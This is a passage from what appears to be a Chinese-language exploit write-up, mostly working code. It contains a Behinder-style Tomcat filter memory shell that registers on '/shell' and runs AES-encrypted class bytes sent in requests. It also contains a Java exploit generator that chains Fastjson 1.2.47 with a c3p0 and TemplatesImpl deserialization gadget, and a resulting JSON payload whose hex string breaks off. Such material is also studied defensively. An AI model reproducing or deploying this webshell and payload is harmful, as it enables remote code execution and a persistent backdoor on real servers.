class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">();</span>                <span class="n">this</span><span class="o">.</span><span class="n">RushThere</span><span class="p">(</span><span class="n">Lclass</span><span class="p">,</span> <span class="n">cl</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">);</span>            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;java.lang.ClassLoader&#34;</span><span class="p">))</span> <span class="p">{</span>                <span class="n">Lclass</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">();</span>                <span class="n">this</span><span class="o">.</span><span class="n">RushThere</span><span class="p">(</span><span class="n">Lclass</span><span class="p">,</span> <span class="n">cl</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">);</span>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>                <span class="n">Lclass</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">()</span><span class="o">.</span><span class="n">getSuperclass</span><span class="p">();</span>                <span class="n">this</span><span class="o">.</span><span class="n">RushThere</span><span class="p">(</span><span class="n">Lclass</span><span class="p">,</span> <span class="n">cl</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">);</span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">filterChain</span><span class="o">.</span><span class="n">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span> <span class="n">servletResponse</span><span class="p">);</span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">destroy</span><span class="p">()</span> <span class="p">{</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">RushThere</span><span class="p">(</span><span class="n">Class</span> <span class="n">Lclass</span><span class="p">,</span> <span class="n">ClassLoader</span> <span class="n">cl</span><span class="p">,</span> <span class="n">HttpSession</span> <span class="n">session</span><span class="p">,</span> <span class="n">HttpServletRequest</span> <span class="n">request</span><span class="p">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="ne">String</span><span class="p">,</span> <span class="ne">Object</span><span class="o">&gt;</span> <span class="n">pageContext</span><span class="p">)</span> <span class="p">{</span>        <span class="n">byte</span><span class="p">[]</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="n">getDecoder</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>            <span class="n">Method</span> <span class="n">define</span> <span class="o">=</span> <span class="n">Lclass</span><span class="o">.</span><span class="n">getDeclaredMethod</span><span class="p">(</span><span class="s2">&#34;defineClass&#34;</span><span class="p">,</span> <span class="n">byte</span><span class="p">[]</span><span class="o">.</span><span class="k">class</span><span class="p">,</span> <span class="n">Integer</span><span class="o">.</span><span class="n">TYPE</span><span class="p">,</span> <span class="n">Integer</span><span class="o">.</span><span class="n">TYPE</span><span class="p">);</span>            <span class="n">define</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>            <span class="n">Class</span> <span class="n">uclass</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">try</span> <span class="p">{</span>                <span class="n">uclass</span> <span class="o">=</span> <span class="n">cl</span><span class="o">.</span><span class="n">loadClass</span><span class="p">(</span><span class="s2">&#34;U&#34;</span><span class="p">);</span>            <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">ClassNotFoundException</span> <span class="n">var18</span><span class="p">)</span> <span class="p">{</span>                <span class="n">uclass</span> <span class="o">=</span> <span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="n">define</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">cl</span><span class="p">,</span> <span class="n">bytecode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bytecode</span><span class="o">.</span><span class="n">length</span><span class="p">);</span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">uclass</span><span class="o">.</span><span class="n">getDeclaredConstructor</span><span class="p">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="k">class</span><span class="p">);</span>            <span class="n">constructor</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>            <span class="ne">Object</span> <span class="n">u</span> <span class="o">=</span> <span class="n">constructor</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getClassLoader</span><span class="p">());</span>            <span class="n">Method</span> <span class="n">Um</span> <span class="o">=</span> <span class="n">uclass</span><span class="o">.</span><span class="n">getDeclaredMethod</span><span class="p">(</span><span class="s2">&#34;g&#34;</span><span class="p">,</span> <span class="n">byte</span><span class="p">[]</span><span class="o">.</span><span class="k">class</span><span class="p">);</span>            <span class="n">Um</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>            <span class="ne">String</span> <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;3ad2fddfe8bad8e6&#34;</span><span class="p">;</span>            <span class="n">session</span><span class="o">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s2">&#34;u&#34;</span><span class="p">,</span> <span class="n">k</span><span class="p">);</span>            <span class="n">Cipher</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="s2">&#34;AES&#34;</span><span class="p">);</span>            <span class="n">c</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">new</span> <span class="n">SecretKeySpec</span><span class="p">(</span><span class="n">k</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(),</span> <span class="s2">&#34;AES&#34;</span><span class="p">));</span>            <span class="n">byte</span><span class="p">[]</span> <span class="n">eClassBytes</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">doFinal</span><span class="p">((</span><span class="n">new</span> <span class="n">BASE64Decoder</span><span class="p">())</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getReader</span><span class="p">()</span><span class="o">.</span><span class="n">readLine</span><span class="p">()));</span>            <span class="n">Class</span> <span class="n">eclass</span> <span class="o">=</span> <span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="n">Um</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">eClassBytes</span><span class="p">);</span>            <span class="ne">Object</span> <span class="n">a</span> <span class="o">=</span> <span class="n">eclass</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>            <span class="n">Method</span> <span class="n">b</span> <span class="o">=</span> <span class="n">eclass</span><span class="o">.</span><span class="n">getDeclaredMethod</span><span class="p">(</span><span class="s2">&#34;equals&#34;</span><span class="p">,</span> <span class="ne">Object</span><span class="o">.</span><span class="k">class</span><span class="p">);</span>            <span class="n">b</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>            <span class="n">b</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">);</span>        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">var19</span><span class="p">)</span> <span class="p">{</span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">SerializationHandler</span><span class="p">[]</span> <span class="n">handlers</span><span class="p">)</span> <span class="n">throws</span> <span class="n">TransletException</span> <span class="p">{</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="p">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="p">)</span> <span class="n">throws</span> <span class="n">TransletException</span> <span class="p">{</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="p">{</span>        <span class="n">try</span> <span class="p">{</span>            <span class="ne">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;AutomneGreet&#34;</span><span class="p">;</span>            <span class="n">WebappClassLoaderBase</span> <span class="n">webappClassLoaderBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">WebappClassLoaderBase</span><span class="p">)</span><span class="ne">Thread</span><span class="o">.</span><span class="n">currentThread</span><span class="p">()</span><span class="o">.</span><span class="n">getContextClassLoader</span><span class="p">();</span>            <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">webappClassLoaderBase</span><span class="o">.</span><span class="n">getResources</span><span class="p">()</span><span class="o">.</span><span class="n">getContext</span><span class="p">();</span>            <span class="n">Field</span> <span class="n">Configs</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;filterConfigs&#34;</span><span class="p">);</span>            <span class="n">Configs</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>            <span class="n">Map</span> <span class="n">filterConfigs</span> <span class="o">=</span> <span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">Configs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">standardContext</span><span class="p">);</span>            <span class="k">if</span> <span class="p">(</span><span class="n">filterConfigs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;AutomneGreet&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>                <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="n">new</span> <span class="n">IceShell</span><span class="p">();</span>                <span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="n">new</span> <span class="n">FilterDef</span><span class="p">();</span>                <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilter</span><span class="p">(</span><span class="n">filter</span><span class="p">);</span>                <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilterName</span><span class="p">(</span><span class="s2">&#34;AutomneGreet&#34;</span><span class="p">);</span>                <span class="n">filterDef</span><span class="o">.</span><span class="n">setFilterClass</span><span class="p">(</span><span class="n">filter</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getName</span><span class="p">());</span>                <span class="n">standardContext</span><span class="o">.</span><span class="n">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span>                <span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="n">new</span> <span class="n">FilterMap</span><span class="p">();</span>                <span class="n">filterMap</span><span class="o">.</span><span class="n">addURLPattern</span><span class="p">(</span><span class="s2">&#34;/shell&#34;</span><span class="p">);</span>                <span class="n">filterMap</span><span class="o">.</span><span class="n">setFilterName</span><span class="p">(</span><span class="s2">&#34;AutomneGreet&#34;</span><span class="p">);</span>                <span class="n">filterMap</span><span class="o">.</span><span class="n">setDispatcher</span><span class="p">(</span><span class="n">DispatcherType</span><span class="o">.</span><span class="n">REQUEST</span><span class="o">.</span><span class="n">name</span><span class="p">());</span>                <span class="n">standardContext</span><span class="o">.</span><span class="n">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span>                <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="k">class</span><span class="o">.</span><span class="n">getDeclaredConstructor</span><span class="p">(</span><span class="n">Context</span><span class="o">.</span><span class="k">class</span><span class="p">,</span> <span class="n">FilterDef</span><span class="o">.</span><span class="k">class</span><span class="p">);</span>                <span class="n">constructor</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>                <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="p">(</span><span class="n">ApplicationFilterConfig</span><span class="p">)</span><span class="n">constructor</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(</span><span class="n">standardContext</span><span class="p">,</span> <span class="n">filterDef</span><span class="p">);</span>                <span class="n">filterConfigs</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&#34;AutomneGreet&#34;</span><span class="p">,</span> <span class="n">filterConfig</span><span class="p">);</span>            <span class="p">}</span>        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">var10</span><span class="p">)</span> <span class="p">{</span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>内存马做好后结合c3p0链生成json，最终exp如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;
</span></span><span class="line"><span class="cl">public class rce {    public static void main(String[] args) throws Exception {        String hex2 = bytesToHex(tobyteArray(gen()));        String FJ1247 = &#34;{n&#34; +                &#34;    &#34;a&#34;:{n&#34; +                &#34;        &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;java.lang.Class&#34;,n&#34; +                &#34;        &#34;val&#34;:&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;n&#34; +                &#34;    },n&#34; +                &#34;    &#34;b&#34;:{n&#34; +                &#34;        &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;,n&#34; +                &#34;        &#34;\u0075\u0073\u0065\u0072\u004F\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006E\u0067&#34;:&#34;HexAsciiSerializedMap:&#34; + hex2 + &#34;;&#34;,n&#34; +                &#34;    }n&#34; +                &#34;}n&#34;;        System.out.println(FJ1247);    }    //FastJson原生反序列化加载恶意类字节码    public static Object gen() throws Exception {        TemplatesImpl templates = TemplatesImpl.class.newInstance();        byte[] bytes = Files.readAllBytes(Paths.get(&#34;C:\Users\Administrator\Desktop\untitled\src\main\java\IceShell.java&#34;)); //做好的冰蝎马地址，读取其中字节即可        setValue(templates, &#34;_bytecodes&#34;, new byte[][]{bytes});        setValue(templates, &#34;_name&#34;, &#34;1&#34;);        setValue(templates, &#34;_tfactory&#34;, null);
</span></span><span class="line"><span class="cl">        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);
</span></span><span class="line"><span class="cl">        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);        setValue(bd,&#34;val&#34;,jsonArray);
</span></span><span class="line"><span class="cl">        HashMap hashMap = new HashMap();        hashMap.put(templates,bd);        return hashMap;    }    public static void setValue(Object obj, String name, Object value) throws Exception{        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    }
</span></span><span class="line"><span class="cl">    //将类序列化为字节数组    public static byte[] tobyteArray(Object o) throws IOException {        ByteArrayOutputStream bao = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(bao);        oos.writeObject(o);   //        return bao.toByteArray();    }
</span></span><span class="line"><span class="cl">    //字节数组转十六进制    public static String bytesToHex(byte[] bytes) {        StringBuffer stringBuffer = new StringBuffer();        for (int i = 0; i &lt; bytes.length; i++) {            String hex = Integer.toHexString(bytes[i] &amp; 0xff);      //bytes[]中为带符号字节-255~+255，&amp;0xff: 保证得到的数据在0~255之间            if (hex.length()&lt;2){                stringBuffer.append(&#34;0&#34; + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误            }else {                stringBuffer.append(hex);            }        }        return stringBuffer.toString();    }}
</span></span></code></pre></td></tr></table>
</div>
</div><p>加入tomcat和fastjson依赖，编译运行，得到一串json格式数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;            &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;            &lt;version&gt;8.5.37&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;            &lt;version&gt;1.2.47&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{  &#34;a&#34;:{    &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;java.lang.Class&#34;,    &#34;val&#34;:&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;  },  &#34;b&#34;:{    &#34;\u0040\u0074\u0079\u0070\u0065&#34;:&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;,    &#34;\u0075\u0073\u0065\u0072\u004f\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006e\u0067&#34;:&#34;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e002000078700000254acafebabe0000003401880a005e00cc0800cd09004b00ce0700cf0700d00b000400d10700d20a000700cc08007f0b004900d308007b08007d0a00d400d50a00d400d60b000400d70800d80a00d900da0a002400db0a001c00dc0a001c00dd0800de0a004b00df0b00e000e10a00e200e30800e40a00e500e60800e70700e80700a40900e900ea0a001c00eb0a00ec00ed0800ee0a002700ef0700f00700f10a00e900f20a00ec00f30700f40a001c00f50a00f600ed0a001c00f70a00f600f80800f908009d0b00fa00fb0800fc0a00fd00fe0700ff0a00d901000a003101010a00fd01020701030a003500cc0b000401040a010501060a003501070a00fd01080a001c010908010a07010b08010c07010d0a003f010e0b010f01100701110801120a001c01130800c90a001c01140a011500ed0a011501160701170b004901160701180a004b00cc0701190a004d00cc0a004d011a0a004d011b0a004d011c0a0042011d07011e0a005300cc08011f0a005301200a0053011b09012101220a012101230a005301240a0042012507012607012707012807012901000270610100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000a4c4963655368656c6c3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e7307012a0100104d6574686f64506172616d6574657273010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b29560100064c636c6173730100114c6a6176612f6c616e672f436c6173733b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b010007726571756573740100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b010008726573706f6e73650100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b01000773657373696f6e0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b0100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507011807012b07012c07012d0700cf0700d007012e0701170700f40700e807012f01000764657374726f79010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b295601000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b010001750100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c61737342797465730100025b4201000665636c617373010001610100016201000862797465636f64650701300700f007010b0100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701310100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000a536f7572636546696c6501000d4963655368656c6c2e6a6176610c00630064010010336164326664646665386261643865360c006000610100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650c013201330100116a6176612f7574696c2f486173684d61700c013401350701360c013701380c0139013a0c013b013c010004504f535407013d0c010a013e0c013f01400c014101400c0142013c0100156a6176612e6c616e672e436c6173734c6f616465720c0094009507012d0c007101430701440c0145014801026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540701490c014a014b01000b646566696e65436c61737301000f6a6176612f6c616e672f436c61737307014c0c014d00740c014e014f0701300c01500151010001550c015201530100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100106a6176612f6c616e672f4f626a6563740c015401550c015601570100156a6176612f6c616e672f436c6173734c6f616465720c0158015907015a0c015b013a0c015c015d0100016707012e0c015e015f0100034145530701600c0161016201001f6a617661782f63727970746f2f737065632f536563726574